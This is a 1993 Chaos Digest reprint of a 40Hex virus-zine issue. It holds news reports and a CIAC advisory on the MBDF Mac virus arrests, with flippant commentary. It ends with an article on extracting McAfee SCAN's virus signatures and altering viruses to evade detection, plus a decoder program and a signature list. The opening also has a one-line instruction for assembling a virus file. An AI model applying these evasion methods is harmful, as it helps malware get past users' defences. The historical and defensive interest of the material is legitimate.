PKLite header (Use NOLITE in this issue) and no one will be able to find it.
Anyway it gets the job done.

To make the above hex into a working file, first cut on the dotted lines.
Name the resulting file KENNEDY.TXT.
Then: DEBUG < KENNEDY.TXT  and you'll have a working virus.

                                        -Instigator

+++++

40Hex Number 6 Volume 2 Issue 2                                   File 008

Take a look at this.  I picked it up on fidonet, originally from Virus-L
digest.  all the stuff in *< >*'s are my comments.
                - Demogorgon

------------------------------
VIRUS-L Digest   Wednesday, 26 Feb 1992    Volume 5 : Issue 44
------------------------------

Date:    Tue, 25 Feb 92 10:10:14 -0500
>From:    mha@baka.ithaca.ny.us (Mark Anbinder)
Subject: MBDF Suspects Arrested (Mac)

The Cornell Daily Sun reported in this morning's issue that two
Cornell University sophomores, David Blumenthal and Mark Pilgrim, were
arrested Monday evening and arraigned in Ithaca City Court on one
count each of second degree computer tampering, in connection with the
release of the MBDF virus that infected Macs worldwide over the last
several days.  The two are being held in Tompkins County Jail.
*< huh?  How does one get arrested for spreading a virus, you ask? read on >*
Further charges are pending.

---
** many lines of mail routing crap have been deleted **

Date: Tue, 25 Feb 1992 11:47:32 PST
>From: lipa@camis.stanford.edu (Bill Lipa)
Subject: Alleged MBDF virus-creators arrested at Cornell

"Computer Virus Traced to Cornell Students"

by Jeff Carmona

[The Cornell Daily Sun, 25 February 1992]

  Two Cornell students were arrested yesterday for allegedly creating and
launching *< launching ? Bon voyage, we launched you !>* a computer virus
that crippled computers around the world, according to M. Stuart Lynn, the
University's vice president for information technologies.

  David Blumenthal '94 and Mark Pilgrim '94 were arrested by Department of
Public Safety officers and arraigned in Ithaca City Court on one count of
second-degree computer tampering, a misdemeanor, *< cool, its only a
misdemeanor, how bad could it be ? >* Lynn said.

  Both students were remanded to the Tompkins County Jail and remained in
custody early this morning. They are being held on $2,000 cash or $10,000
bail bond, officials said.

  Cornell received national attention in Nov. 1988 when Robert T. Morris
Jr., a former graduate student, was accused of unleashing a computer virus
into thousands of government and university computers.

  Morris, convicted under the 1986 Computer Fraud and Abuse Act, was fined
$10,000, given a three-year probation and ordered to do 400 hours of
community service by a federal judge in Syracuse, according to Linda Grace-
Kobas, *< Whats a Koba?? >* director of the Cornell News Service.

  Lynn would not compare the severity of the current case with Morris',
saying that "each case is different."

  Lynn said the virus, called "MBDFA" was put into three Macintosh games --
Obnoxious Tetris, Tetriscycle and Ten Tile Puzzle.

  On Feb. 14, the games were launched from Cornell to a public archive at
Stanford University in Palo Alto, Calif, Lynn said.

*< I guess these guys actually put it up on the archive under their own   >*
*< accounts! Don't they know they can trace that stuff? duhhh...          >*

>From there, the virus spread to computers in Osaka, Japan and elsewhere
around the world *< the archive was a dumb idea if thats how they got caught,
but it spread like hell >* when users connected to computer networks via
modems, he added. It is not known how many computers the virus has affected
worldwide, he explained.

  When computer users downloaded the infected games, the virus caused "a
modification of system software," *< oooh...lets not get too technical >* Lynn
said. "This resulted in unusual behavior and system crashes," he added.

  Lynn said he was not aware of anyone at Cornell who reported finding the
virus on their computers.

  The virus was traced to Cornell last Friday, authorities were quickly
notified and an investigation began, Lynn said.

  "We absolutely deplore this kind of bahavior," Lynn said. "We will pursue
this matter to the fullest."

  Armed with search warrants, Public Safety investigators removed more than
a dozen crates full of evidence from the students' residences in Baker and
Founders halls on West Campus. *< sounds like a typical, over-kill bust to
me.  If you don't know what it is, take it. >*

Public Safety officials refused to disclose the contents of the crates or
issue any comment about the incident when contacted repeatedly by phone last
night.  *< thats because they don't know what the fuck the stuff is >*

  "We believe this was dealt with very quickly and professionally," Lynn
said.

  The suspects are scheduled to appear in Ithaca City Court at 1 p.m. today
and additional charges are pending, according to Grace-Kobas.

  Because spreading a computer virus violates federal laws, "conceivably,
the FBI could be involved," she added. Officials with the FBI could not be
reached to confirm or deny this.

  Blumenthal and Pilgrim, both 19-year-olds, were current student employees
at Cornell Information Technologies (CIT), Lynn said. He would not say
whether the students launched the virus from their residence hall rooms or
>From a CIT office.

  Henrik N. Dullea '61, vice president for University relations, said he
thinks "the act will immediately be associated with the University," not
only with the individual students charged.

  Because a major virus originated from a Cornell student in the past, this
latest incident may again "bring a negative reaction to the entire
institution," Dullea said. *< "blah, blah, blah" >*

  "These are very selfish acts," Lynn said, referring to the intentional
distribution of computer viruses, because innocent people are harmed.

  Lynn said he was unaware of the students' motive for initiating the virus.
Lynn said CIT put out a notice yesterday to inform computer users about the
"very virulent" virus. A virus-protection program, such as the new version of
Disinfectant, can usually cure computers, but it may be necessary to "rebuild
the hard drive" *< egad! Not the dreaded "virus-that-makes-you-rebuild-your-
hard-drive" !>* in some cases, he added.

  A former roommate of Blumenthal said he was not surprised by news of the
arrest. Computers were "more than a hobby" for Blumenthal, said Glen Fuller
'95, his roommate from last semester. "He was in front of the computer all
day," Fuller said.

  Blumenthal, who had a modem, would "play around with viruses because they
were a challenge to him," Fuller said. He said that, to his knowledge,
Blumenthal had never released a virus before.

-->-<------ Cut Here --------------------------

------------------------------
VIRUS-L Digest   Friday, 28 Feb 1992    Volume 5 : Issue 46
------------------------------

Date:    Wed, 26 Feb 92 11:08:45 -0800
>From:    karyn@cheetah.llnl.gov (Karyn Pichnarczyk)
Subject: CIAC Bulletin C-17: MBDF A on Macintosh (Mac)

                           NO RESTRICTIONS
        _____________________________________________________
             The Computer Incident Advisory Capability
                         ___  __ __    _     ___
                        /       |     / \   /
                        \___  __|__  /___\  \___
        _____________________________________________________
                           INFORMATION BULLETIN

               New Virus on Macintosh Computers: MBDF A

February 25, 1992, 1130 PST                                 Number C-17

________________________________________________________________________
NAME:     MBDF A virus
PLATFORM: Macintosh computers-except MacPlus and SE (see below)
DAMAGE:   May cause program crashes
SYMPTOMS: Claris applications indicate they have been altered; some
          shareware may not work, unexplained system crashes
DETECTION &
ERADICATION: Disinfectant 2.6,Gatekeeper 1.2.4, Virex 3.6,
             VirusDetective 5.0.2, Rival 1.1.10, SAM 3.0
________________________________________________________________________
                     Critical Facts about MBDF A

A new Macintosh virus, MBDF A, (named for the resource it exploits)
has been discovered.  This virus does not appear to maliciously cause
damage, but simply copies itself from one application to another.
MBDF A was discovered at two archive sites in newly posted game
applications, and has a high potential to be very widespread.

Infection Mechanism

This virus is an "implied loader" virus, and it works in a similar
manner to other implied loader viruses such as CDEF and MDEF.  Once
the virus is active, clean appliacation programs will become infected
as soon as they are executed.  MBDF A infects only applications, and
does not affect data files.  This virus replicates under both System 6
and System 7.  While MBDF A may be present on ALL types of Macintosh
systems, it will not spread if the infected system is a MacPlus or a
Mac SE (although it does spread on an SE/30).

Potential Damage

The MBDF A virus has no malicious damaging characteristics, however,
it may cause programs to inexplicably crash when an item is selected
from the menu bar.  Some programs, such as the shareware
"BeHierarchic" program, have been reported to not operate correctly
when infected.  Applications written with self-checking code, such as
those written by the Claris corporation, will inform the user that
they have been altered.

When MBDF A infects the system file, it must re-write the entire
system file back to disk; this process may take two or three minutes.
If the user assumes the system has hung, and reboots the Macintosh
while this is occuring, the entire system file will be corrupted and
an entire reload of system software must then be performed.

This virus can be safely eradicated from most infected programs,
although CIAC recommends that you restore all infected files from an
uninfected backup.

------------------------------

End of Chaos Digest #1.49
************************************

Chaos Digest              Mercredi 9 Juin 1993        Volume 1 : Numero 50
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.50 (9 Juin 1993)
File 1--40H VMag Number 6 Volume 2 Issue 2 #008(2)-009 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 6 Volume 2 Issue 2 #008(2)-009 (reprint)


Detection and Eradication

Because MBDF A has been recently discovered, only anti-viral packages
updated since February 20, 1992 will locate and eradicate this virus.
All the major Macintosh anti-viral product vendors are aware of this
virus and have scheduled updates for their products.  These updates
have all been available since February 24, 1992.  The updated versions
of some products are Disinfectant 2.6, Gatekeeper 1.2.4, Virex 3.6,
SAM 3.0, VirusDetective 5.0.2, and Rival 1.1.10.  Some Macintosh
applications (such as the Claris software mentioned above) may contain
self-verification procedures to ensure the program is valid before
each execution; these programs will note unexpected alterations to
their code and will inform the user.

MBDF A has been positively identified as present in two shareware
games distributed by reliable archive sites: "Obnoxious Tetris" and
"Ten Tile Puzzle".  The program "Tetricycle" (sometimes named
"Tetris-rotating") is a Trojan Horse program which installs the virus.
If you have downloaded these or any other software since February 14,
1992 (the day these programs were loaded to the archive sites), CIAC
recommends that you acquire an updated version of an anti-viral
product and scan your system for the existence of MBDF A.

For additional information or assistance, please contact CIAC:

        Karyn Pichnarczyk
        (510) 422-1779 or (FTS) 532-1779
        karyn@cheetah.llnl.gov

Call CIAC at (510)422-8193/(FTS)532-8193.
Send e-mail to ciac@llnl.gov

PLEASE NOTE: Many users outside of the DOE and ESnet computing
communities receive CIAC bulletins.  If you are not part of these
communities, please contact your agency's response team to report
incidents.  Some of the other teams include the NASA NSI response
team, DARPA's CERT/CC, NAVCIRT, and the Air Force response team.  Your
agency's team will coordinate with CIAC.

CIAC would like to thank Gene Spafford and John Norstad, who provided
some of the information used in this bulletin.  This document was
prepared as an account of work sponsored by an agency of the United
States Government.  Neither the United States Government nor the
University of California nor any of their employees, makes any
warranty, express or implied, or assumes any legal liability or
responsibility for the accuracy, completeness, or usefulness of any
information, apparatus, product, or process disclosed, or represents
that its use would not infringe privately owned rights.  Reference
herein to any specific commercial products, process, or service by
trade name, trademark, manufacturer, or otherwise, does not
necessarily constitute or imply its endorsement, recommendation or
favoring by the United States Government or the University of
California.  The views and opinions of authors expressed herein do not
necessarily state or reflect those of the United States Government or
the University of California, and shall not be used for advertising or
product endorsement purposes.

-->-<----- Cut Here -------------------------

------------------------------
VIRUS-L Digest   Friday, 28 Feb 1992    Volume 5 : Issue 46
------------------------------

Date:    Wed, 26 Feb 92 15:32:02 -0500
>From:    mha@baka.ithaca.ny.us (Mark Anbinder)
Subject: Cornell MBDF Press Release (Mac)

_____________________________________________________
PRESS RELEASE ISSUED BY CORNELL NEWS SERVICE 2/25/91

Students charged
with releasing
computer virus

By Linda Grace-Kobas

Following a university investigation that tracked a computer virus and
its originators, two Cornell students were arrested and charged with
computer tampering for allegedly launching a computer virus embedded in
three games into national computer archives.  Arraigned Feb. 24 in
Ithaca City Court were David S. Blumenthal, 19, a sophomore in the
College of Engineering, and Mark Andrew Pilgrim, 19, a sophomore in the
College of Arts and Sciences.  They were charged with computer tampering
in the second degree, a Class A misdemeanor.  The pair is being held in
Tompkins County Jail with bail set at $2,000 cash bond or $10,000
property bond.  At a hearing Tuesday afternoon, Judge Sherman returned
the two to jail with the same bond and recommended that they remain in
jail until at least Friday pending the federal investigation.  A
preliminary hearing is set for April 10.

Both students were employed by Cornell Information Technologies, which
runs the university's computer facilities.  Pilgrim worked as a student
operator in an Apple Macintosh facility from which the virus is believed
to have been launched.  The university's Department of Public Safety is
working with the Tompkins County district attorney's office, and
additional charges are expected to be filed.  The Federal Bureau of
Investigation has contacted the university to look at possible violations
of federal laws, officials said.  The Ithaca Police Department is also
assisting in the investigation.

"We absolutely abhor this type of behavior, which appears to violate the
university's computer abuse policy as well as applicable state and
federal law," commented M. Stuart Lynn, vice president for information
technologies, who headed the investigation to track the originators of
the virus.  "Cornell will pursue all applicable remedies under our own
policies and will cooperate with law enforcement authorities."

Lynn said Cornell was alerted Feb. 21 that a Macintosh computer virus
embedded in versions of three computer games, Obnoxious Tetris,
Tetricycle and Ten Tile Puzzle, had possibly been launched through a
Cornell computer.  A virus is normally embedded in a program and only
propagates to other programs on the host system, he explained.
Typically, when an infected application is run, the virus will attack the
system software and then other applications will become infected as they
are run.

The virus, MBDF-A, had been deposited on Feb. 14 directly and indirectly
into several computer archives in the U.S. and abroad, including
SUMEX-AIM at Stanford University and archives at the University of Texas,
the University of Michigan and another in Osaka, Japan.  These archives
store thousands of computer programs available to users of Internet, the
worldwide computer network.

Macintosh users who downloaded the games to their computers were subject
to a variety of problems, notably the modification of system software and
application programs, resulting in unusual behavior and possible system
crashes.  Apparently, there was no intent to destroy data, Lynn said, but
data could be destroyed in system crashes.

Reports of the virus have been received from across the United States and
around the world, including Wales, Britain, Lynn said, adding that he has
no estimate for the number of individuals who might have obtained the
games.

As soon as the virus was identified, individuals and groups across the
country involved with tracking viruses sent messages across computer
networks to alert users who might have been affected by the virus, Lynn
added.  The virus has since been removed from all archives and
"disinfectant" software available to the Internet community has been
modified so that individual Macintosh users can purge their computers of
it.

"Our sense is that the virus was controlled very rapidly," he said.  In
1988, Cornell received national attention when graduate student Robert T.
Morris Jr. launched a computer virus into important government and
university research networks.  That virus, actually considered a "worm"
since it was self-perpetuating, caused major damage in high-level
systems.  Morris was convicted under the 1986 Computer Fraud and Abuse
Act and fined $10,000, given three years probation and ordered to do 400
hours of community service by a federal judge in Syracuse, N.Y.

The new virus differs greatly from the Morris worm, Lynn said.  "This
virus is not to be compared with the Morris worm, which independently
moved from machine to machine across the network," he explained.  All
Macintosh users should take appropriate measures to be certain their
systems are not infected with the virus.

News Service science writer William Holder also contributed to
this report.

---
Mark H. Anbinder                      607-257-2070 - FAX 607-257-2657
BAKA Computers, Inc.                  QuickMail QM-QM 607-257-2614
200 Pleasant Grove Road               mha@baka.ithaca.ny.us
Ithaca, NY 14850

-->-<----- Cut Here -------------------------

+++++

40Hex Number 6 Volume 2 Issue 2                                     File 009

            -=[ The 'McAfee scan' viral footprint codes ]=-

                                   -or-

             /*******************************************/
             /* A fool and his scanner, can part a user */
             /*       from his hard earned money.       */
             /*******************************************/

                             - written by -
                              GodNet Raider
                                 - of -
                          The CyberUnderground


                      Thrown into 40Hex by DecimatoR
                         from Usenet alt.security

-=[ "Information is the greatest weapon of power to the modern wizard." ]=-

]-------------------------------------------------------------------------[

Introduction:
-------------

    Recently I began to wonder about the usefulness of 'virus scanners'
and what if any difference do they have with a simple text/hex search
program (like nortons filefind/ts). An if there was no real DIFFERENCE,
how secure is the system that used them.

Problems with scanning:
+++++++++++++++++++++++

    The first question I had to ask was, What does a 'virus scanner' actually
look for? Does it only look for one string of codes or several at different
places in the file?

    To answer this question I called a local BBS an dl'ed McAfee's
scan3.7v64 (to evaluate and after my tests, it was erased for its lack of
offering any real protection). Then I went to my archives to retrieve some
viruses I have experimented with in the past (of which where Jerusalem B and
Dark Avenger).

    I ran scan to verify that the virus files where viruses (3 of which did
not set off any alarm even tho there was a listing in the documentation for
them, so I removed them from the test). Then using a sector editor looked at
the source for the McAfee asso. scan3.7v64 (here after know just as scan64)
to find that the footprint information was encoded. Needless to say this did
not stop me (for the sake of those who are into the tech aspects of things,
the actual method used to get the codes are included at the end of the
article with the codes found), It took less than an hour to get the codes I
was looking for (without disassembling the code but by looking into the
memory allocated to the program).

    What I found out was scan was just a simple hex searcher (that kept
its data locked up till needed). It could also be fooled by any program
that contained the same hex string as a real virus (this was proved when,
using a sector editor, I added the scan64 footprint for the Jerusalem B
into the top of a text file (a place this code would never show up in a real
infection) then renamed it to *.com; scan64 reported it as infected).

    Once the codes where obtained, using debug directly on a virus file,
I was able to mutate the virus to no longer be detectable by scan64 without
destroying the integrity of it. For the virus was still able to infect files,
and scan64 could no longer track it. I was still able to track and control it
using norton's filefind, diskmon, diskedit, and (of course) DOS erase.

    So it seems my question was answered. Some 'virus scanners' just scan
for a single string of hex character. This is fine if viruses NEVER changed
or programs would NEVER use code similar to what a virus would (the smaller
the footprint string the bigger the chance of mistaken alarms). For if
a 'virus scanner' programer just keeps making a new release each time there
is a new virus (an I will not get into the morality of charging customers
the full price of an software upgrade rather than allowing them to buy/dl
new footprint data files as they become available) for the program will
eventually grow to unwealdable sizes. An it should be noted there are other
programs that may do the same job faster, more upward compatibility, and
you may already have them on hand.

A possible solution:
++++++++++++++++++++

    One thing that I think is a good idea is when a program allows users
to add new footprint data to it (like nortons' virus package). For now
users don't need to buy new releases for detection of viruses they may not
get/be able to detect. Instead for the cost of a call to a support bbs (part
of the original software agreement?) the user can get new data as it becomes
available or when they fine a new one on their system they can immediately
add the new footprint rather than wait for the next version to be released.

Method used to obtain footprints:
+++++++++++++++++++++++++++++++++

    After finding the data I was looking for was encoded I thought, How can
I get the data I wanted for my tests?

    Disassembling was out, not for any MORAL reason but, for the time
involved. So I thought it must have to decode the data for it's own use
and to save time it would do it all before the scan rather than slow the
process down by doing a full decode. So I needed to look at the memory
image of the running program. Thanks to DOS 5.0 and dosshell I was able to
do this.

    After spawning the scan task under the dos shell I used alt-tab to
swap back to the shell. Once back in the shell I used the shell commands to
copy the 
    Then using a sector editor I searched though the temp file created by
the dos shell. I found an area of data that contained the virus names and
non ascii text data separating them. Even though the strings of ascii data
(virus names) ended with a zero character (as variable strings have a
tendency to), the random data did not end with a common signal character (as
expected for code can be any character). There was also no character count
stored (the data length varied so it could not be assumed by the scan
program as well). So I continued to search though the data.

    I eventually found another area that had the same text strings (virus
names). This time the first character of the none ascii data gave the count
of the data size to the following text string. I knew I had found it so I
extracted this data to another file (starting at 0 offset in the new file).
Then wrote down the some codes and checked them against viruses I had.

    The codes I had did not seem match. This did not stop me. I took one
virus (that my understanding said scan was only looking for 6 consecutive
bytes to match) and started zapping bytes (in a file scan said was infected)
to find what it was looking for. The processes involved zapping one sector
at a time till scan said it was not infected, then half of that sector, then
half of a half, and so on. It came down to 6 CONSECUTIVE bytes as I expected.
But they where DIFFERENT from the ones I had.

    So I went to the windows calculator (it allows byte arithmetic in hex,
ie.. 0xff + 0x04 = 0x03 (rollover, carry is ignored), it would be outside
the scope of this ARTICLE to explain why I thought byte arithmetic was
important). Some quick subtraction found a 0x93 (decimal 147) DIFFERENCE
between the actual codes and the ones from the allocated memory uses by
scan.

    So taking another virus that scan said was infected I did the minor
hex math on the codes in the allocated memory used by scan and found the
codes. Then i zapped only the codes and ran scan on the updated virus file.
It said there was no infection. I knew I now had the right codes (after a few
more checks).

    So I created a simple C program (see below) to convert the extract file
I created and converted the codes to a readable form (output from program
listed at end of ARTICLE). Then tested other viruses against the list. An
found the same results.

Binary to hex program:
++++++++++++++++++++++
/*
fp2txt.c
    Convert footprint binary information to text.
        by GodNet Raider

Notes:
    Please forgive the unrefined/unannotated nature of this code it was
    designed as a one shot.
*/

#include 
#include 

#define TRUE 1
#define MAGICNUM 0x93

void
    main (void);

void main (void)
{
    unsigned char
        sVirusFP [128],
        *ptVirusInfo,
        szVirusName [128];
    register unsigned int
        nTmpCnt;
    FILE
        *Stream;

    Stream = fopen ("fp2.img", "rb");
    while (!feof (Stream))
        {
         ptVirusInfo = sVirusFP;
         if (!(*sVirusFP = getc (Stream)))
             exit (0);
         nTmpCnt = (unsigned int) *sVirusFP;
         while (nTmpCnt--)
             *(++ptVirusInfo) = ((unsigned char) getc (Stream)) - MAGICNUM;
         ptVirusInfo = szVirusName;
         while ((*(ptVirusInfo++) = getc (Stream)));
         printf ("\n%s:\n    ", szVirusName);
         ptVirusInfo = sVirusFP;
         nTmpCnt = (unsigned int) *sVirusFP;
         while (nTmpCnt--)
             {
             printf ("0x%02x ", (unsigned int) *(++ptVirusInfo));
             if (nTmpCnt && !((*sVirusFP - nTmpCnt) % 8))
                printf ("\n    ");
            }
         printf ("\n");
         getc (Stream);
        }
    exit (0);
}

Footprints discovered:
++++++++++++++++++++++

The following is a list of the footprint codes found in McAfee asso
Scan3.7v64.

1008 Virus [1008]:
    0x81 0xed 0x38 0x00 0xe8 0xc3

Stoned-II Virus [S-2]:
    0x9c 0x2e 0xff 0x1e 0x09 0x00

VHP-2 Virus [VHP2]:
    0x1c 0x8c 0x44 0x02 0xb8 0x24 0x35 0xcd
    0x21 0x89

VHP Virus [VHP]:
    0x07 0x89 0x7e 0x8a 0x8d 0x7e 0x90 0x89
    0x7e 0x88

Taiwan3 Virus [T3]:
    0x17 0x0f 0x32 0x0a 0x32 0x0a 0x90 0x0b
    0xfb 0x08

Armagedon Virus [Arma]:
    0xb8 0x00 0x43 0xcd 0x21 0x2e 0x89 0x0e
    0x48 0x01

1381 Virus [1381]:
    0x1e 0x06 0x8c 0xc8 0x8e 0xd8 0xb8 0x40
    0x00 0x8e

Tiny Virus [Tiny]:
    0xb4 0x40 0x8d 0x94 0xab 0x01 0xb9 0x02
    0x00 0xcd

Subliminal Virus [Sub]:
    0x8b 0x3e 0x25 0x01 0x8b 0xd7 0x2e 0x8e
    0x06 0x27

Sorry Virus [Sorry]:
    0xeb 0x96 0x83 0x2e 0x12 0x00 0x40 0x83
    0x2e 0x03

1024 Virus [1024]:
    0xc8 0x75 0xed 0x8b 0xd1 0xb8 0x00 0x42
    0xcd 0x21 0x72

RedX Virus [RedX]:
    0x52 0x8b 0x9c 0x17 0x04 0xb9 0x19 0x03
    0x8d 0x94

VP Virus [VP]:
    0x21 0x89 0x1e 0x22 0x03 0x8c 0x06 0x24
    0x03 0xb4

Print Screen-2 [P-2]:
    0x74 0x01 0xbf 0x03 0x00 0xb9 0x20 0x00
    0xf3 0xa4

Joshi Virus [Joshi]:
    0xf3 0xa4 0x8c 0xc0 0x05 0x20 0x00 0x8e
    0xc0 0xbb

Microbes Virus [Micro]:
    0x8e 0xd0 0xbc 0x00 0xf0 0xfb 0xa1 0x13
    0x04 0x2d 0x04

Print Screen Virus [Prtscr]:
    0xcd 0x05 0xfe 0xc8 0xa2 0x60 0x01 0xc3
    0x6f 0x6e 0x2d

Form Virus [Form]:
    0xe8 0xb2 0x00 0x5a 0x5e 0x1f 0x33 0xc0
    0x50 0xb8 0x00 0x7c

June 13th Virus [J13]:
    0x12 0x00 0xb9 0xb1 0x04 0x2e 0x30 0x04
    0x46 0xe2

JoJo Virus [JoJo]:
    0x4d 0x2b 0xd0 0x4a 0x45 0x03 0xe8 0x45
    0x8e 0xc5

Victor Virus [Victor]:
    0x74 0x26 0x80 0xfc 0x5b 0x74 0x21 0x80
    0xfc 0x39

5120 Virus [5120]:
    0x10 0xa2 0xf6 0x0f 0xe8 0xd0 0xfe 0x80
    0x3e 0x4a 0x10 0x02 0x7d 0x22 0xc6 0x46

W-13 Virus [W13]:
    0xf3 0xa4 0x8b 0xfa 0xb4 0x30 0xcd 0x21
    0x3c 0x00

Slow Virus [Slow]:
    0x81 0xc6 0x1b 0x00 0xb9 0x90 0x06 0x2e
    0x80 0x34

Liberty Virus [Liberty]:
    0xe8 0xfd 0xfe 0x72 0x2a 0x3b 0xc1 0x7c
    0x27 0xe8

Fish Virus [Fish]:
    0x0e 0x01 0xcf 0xe8 0x00 0x00 0x5b 0x81
    0xeb 0xa9

Shake Virus [Shake]:
    0x31 0xd2 0x8b 0xca 0xcd 0x21 0x3d 0x00
    0xf0 0x73

Murphy Virus [Murphy]:
    0x81 0x7c 0xfe 0x2e 0x43 0x75 0xed 0xb8
    0x02 0x3d

V800 Virus [V800]:
    0x51 0xad 0x33 0xd0 0xe2 0xfb 0x59 0x31
    0x15 0x47

Kennedy Virus [Kennedy]:
    0x8c 0x55 0x02 0xb8 0x01 0x43 0x33 0xc9
    0xcd 0x21

Yankee Two Virus [Doodle2]:
    0x73 0x03 0x5a 0x5e 0xc3 0x8b 0xf2 0xf6
    0x44 0x15

1971 Virus [1971]:
    0x33 0xd2 0xb8 0x00 0x42 0xcd 0x21 0x72
    0x26 0x81 0x7c

June 16th Virus [June16]:
    0x4d 0xa9 0xa5 0x2e 0x70 0x66 0x2e 0x57
    0x09 0x0f

AIDS II Virus [A2]:
    0xa4 0x00 0x55 0x89 0xe5 0x81 0xec 0x02
    0x02 0xbf 0xca 0x05 0x0e 0x57 0xbf 0x3e
    0x01

1210 Virus [1210]:
    0xc4 0x74 0xf0 0x2e 0x80 0x3e 0x2f 0x04
    0x01 0x75

1720 Virus [1720]:
    0xd8 0x2e 0xa1 0x2c 0x00 0xa3 0xfc 0x03
    0x2e 0xa0

Saturday 14th Virus [Sat14]:
    0x0e 0x1f 0xb8 0x24 0x35 0xcd 0x21 0x8c
    0x06 0x6f

XA1 (1539) Christmas Virus [XA1]:
    0xfa 0x8b 0xec 0x58 0x32 0xc0 0x89 0x46
    0x02 0x81

1392 (Amoeba) Virus [1392]:
    0x16 0xa3 0x21 0x01 0x8b 0x44 0x14 0xa3
    0x23 0x01

Vcomm Virus [Vcomm]:
    0x77 0x02 0xb9 0x20 0x00 0xb4 0x4e 0xcd
    0x21

ItaVir Virus [Ita]:
    0xb8 0x58 0x45 0x89 0x40 0x02 0xb0 0x00
    0x88 0x40 0x04

Korea Virus [Korea]:
    0x8e 0xd0 0xbc 0xf0 0xff 0xfb 0xbb 0x13
    0x04

Solano Virus [Solano]:
    0x12 0x75 0x0e 0x2e 0x8b 0x0e 0x03 0x01

V2000 Virus [2000]:
    0x51 0xe8 0x39 0xfd 0x8e 0xc3 0x26 0x8b

12 Tricks Trojan [Tricks]:
    0x64 0x02 0x31 0x94 0x42 0x01 0xd1 0xc2
    0x4e 0x79 0xf7

12 Tricks Trojan [Tricks-B]:
    0xe4 0x61 0x8a 0xe0 0x0c 0x80 0xe6 0x61

1559 Virus [1559]:
    0x03 0x26 0x89 0x1e 0x92 0x00 0xfb 0xc3
    0x50 0x53 0x51 0x52 0x06

512 Virus [512]:
    0x01 0x8c 0x45 0x70 0x1f 0x89 0x57 0x14
    0x8c 0xca 0x8e 0xda

EDV Virus [EDV]:
    0x75 0x1c 0x80 0xfe 0x01 0x75 0x17 0x5b
    0x07 0x1f 0x58 0x83

Icelandic-3 Virus [Ice-3]:
    0x24 0x2e 0x8f 0x06 0x3b 0x03 0x90 0x2e
    0x8f 0x06

Perfume Virus [Fume]:
    0x04 0x06 0xbf 0xba 0x00 0x57 0xcb 0x0e
    0x1f 0x8e 0x06

Joker Virus [Joke]:
    0x56 0x07 0x45 0x07 0x21 0x07 0x1d 0x49
    0x27 0x6d 0x20 0x73 0x6f 0x20 0x6d 0x75
    0x63

Virus-101 [101]:
    0xb3 0x01 0xb4 0x36 0x70 0xb7 0x01 0xb4
    0x36 0x70 0x8b 0x37 0xb4 0x36 0x70 0xb3
    0x03 0xb4 0x36 0x70 0x03 0xf3 0xb4

Halloechen Virus [Hal]:
    0x8c 0xd0 0x8b 0xd4 0xbc 0x02 0x00 0x36
    0x8b 0x0e

Taiwan Virus [Taiwan]:
    0x8a 0x0e 0x95 0x00 0x81 0xe1 0xfe 0x00
    0xba 0x9e

Oropax Virus [Oro]:
    0x3e 0x01 0x1d 0xf2 0x77 0xd1 0xba 0x00

Chaos Virus [Chaos]:
    0xa1 0x49 0x43 0x68 0x41 0x4f 0x53 0x50
    0x52 0x51 0xe8

4096 Virus [4096]:
    0xf6 0x2e 0x8f 0x06 0x41 0x12 0x2e 0x8f
    0x06 0x43

Virus-90 [90]:
    0x81 0xb8 0xfe 0xff 0x8e 0xd8 0x2d 0xcc

AIDS Information Trojan [Aids]:
    0x31 0x30 0x30 0x2c 0x36 0x32 0x2c 0x33
    0x32 0x00

Devil's Dance Virus [Dance]:
    0x5e 0x1e 0x06 0x8c 0xc0 0x48 0x8e 0xc0
    0x26

Amstrad Virus [Amst]:
    0x72 0x02 0xeb 0x36 0x76 0xba 0x80 0x00
    0xb4 0x1a 0xcd 0x21 0x80 0x3e

Datacrime II-b Virus [Crime-2B]:
    0x2e 0x8a 0x07 0x32 0xc2 0xd0 0xca 0x2e

Holland Girl Virus [Holland]:
    0x36 0x03 0x01 0x33 0xc9 0x33 0xc0 0xac

Do Nothing Virus [Nothing]:
    0x72 0x04 0x50 0xeb 0x07 0x90 0xb4 0x4c

Lisbon Virus [Lisb]:
    0x8b 0x44 0x79 0x3d 0x0a 0x00 0x72 0xde

Sunday Virus [Sunday]:
    0x75 0x10 0x07 0x2e 0x8e 0x16 0x45 0x00
    0x2e 0x8b

Typo COM virus [Typo]:
    0x99 0xfe 0x26 0xa1 0x5a 0x00 0x2e 0x89

DBASE Virus [Dbase]:
    0x80 0xfc 0x6c 0x74 0xea 0x80 0xfc 0x5b
    0x74 0xe5

Ghost Virus :
